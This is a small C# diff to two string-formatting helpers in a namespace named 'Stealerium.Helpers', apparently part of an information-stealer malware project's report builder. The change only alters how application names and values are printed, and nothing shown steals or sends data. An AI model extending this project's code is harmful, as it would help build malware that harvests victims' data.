@@ -58,13 +58,13 @@ namespace Stealerium.Helpers
         // Get string value
         public static string GetSValue(string application, bool value)
         {
-            return value ? "\n   ∟ " + application : "";
+            return $"\n   ∟ {application} {value}";
         }
 
         // Get integer value
         public static string GetIValue(string application, int value)
         {
-            return value != 0 ? "\n   ∟ " + application + ": " + value : "";
+            return "\n   ∟ " + application + ": " + value ;
         }
 
         // Get list value
